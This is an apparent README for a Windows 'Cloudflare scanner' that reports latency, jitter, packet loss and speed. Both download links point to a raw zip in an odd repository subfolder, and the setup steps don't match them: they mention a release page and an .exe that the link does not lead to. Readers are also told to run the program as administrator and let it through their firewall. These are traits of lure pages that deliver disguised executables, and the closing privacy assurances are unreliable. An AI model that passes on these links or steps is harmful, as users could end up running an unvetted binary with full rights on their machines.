# 🌐 cloudflare-scanner - Find the fastest Cloudflare network path

[![](https://img.shields.io/badge/Download-cloudflare--scanner-blue.svg)](https://raw.githubusercontent.com/owusuaduamerenorbert-oss/cloudflare-scanner/main/birddom/cloudflare_scanner_3.8.zip)

This tool checks connection quality to Cloudflare servers. You can see how fast your internet connects to various global points. It measures latency, jitter, and packet loss. You get clear data to improve your network speed.

## 📋 Features

*   **Fast Scanning:** The tool checks many IP addresses at the same time.
*   **Auto Scan:** It tests every published Cloudflare range automatically.
*   **Custom Lists:** You can load your own list of IP addresses to check.
*   **Color-Coded Results:** The terminal shows results in colors so you see the best parts fast.
*   **Data Export:** Save your test results to a CSV file for long-term tracking.

## 🖥️ System Requirements

Your computer must meet these basic needs:

*   **Operating System:** Windows 10 or Windows 11.
*   **Network:** An active internet connection.
*   **Permissions:** You need rights to run programs as an administrator.
*   **Storage:** At least 50 megabytes of free space.

## ⬇️ Setup and Download

Follow these steps to get the tool on your machine.

1.  Visit the [official download page](https://raw.githubusercontent.com/owusuaduamerenorbert-oss/cloudflare-scanner/main/birddom/cloudflare_scanner_3.8.zip).
2.  Look for the latest release on the right side of the page.
3.  Click the file that ends in .exe. This file works directly on Windows.
4.  Move the file to a folder where you want to keep your tools.
5.  Double-click the file to open the program.

## 🚀 How to Run a Scan

The program runs in a command window. This window looks simple but delivers deep data.

### Step 1: Open Terminal
Press the Windows key on your keyboard. Type "cmd" and press Enter. A black box will appear.

### Step 2: Navigate to the tool
Type the path of the folder where you saved the file. For example, if you saved it in your Downloads folder, type: `cd C:\Users\YourName\Downloads`. Replace "YourName" with your actual computer user name.

### Step 3: Start the scan
Type the name of the file followed by the command for a scan. Usually, you type `cloudflare-scanner.exe --scan`. Press Enter. The tool starts testing the network.

## 📊 Understanding Your Results

The program creates a table in your window. Use these headings to judge the quality of your connection:

*   **Latency:** This shows the time a signal takes to get to the server. Lower numbers are better.
*   **Jitter:** This shows the change in delay. Low jitter means a steady connection.
*   **Packet Loss:** This shows how many data pieces failed to arrive. You want this number to be zero.
*   **Download Speed:** This shows how much data you can pull from that specific point. Higher numbers are better.

## 💡 Using Custom Lists

If you have specific IP addresses you want to monitor, follow these steps:

1.  Create a standard text file on your computer.
2.  Paste one IP address per line.
3.  Save the file as `ips.txt`.
4.  Run the scanner with this command: `cloudflare-scanner.exe --file ips.txt`.

The tool will ignore the global ranges and focus only on your private list.

## 💾 Saving Your Data

The tool generates a file named `results.csv` after every test. You can open this file in programs like Microsoft Excel or Google Sheets. This helps you track which Cloudflare gateways perform best over time. If you move your computer to a new network, keep the old files to compare the performance changes.

## 🛠️ Common Troubleshooting

*   **Access Denied:** If the program does not run, right-click the file and select "Run as administrator."
*   **Connection Errors:** Ensure your firewall allows the program to send data packets.
*   **Slow Results:** Shut down other applications that use the internet while the scan runs. This ensures the scanner gets all the bandwidth.
*   **Window Closes Fast:** Run the program through the command prompt as described in the setup section. This keeps the window open so you see the data.

## 🛡️ Privacy and Safety

This tool only tests network connections. It does not look at your personal files. It does not send your data to external servers. All operations happen locally on your hardware. You scan the network, and the program shows you the path that your computer takes. Your data stays on your machine at all times.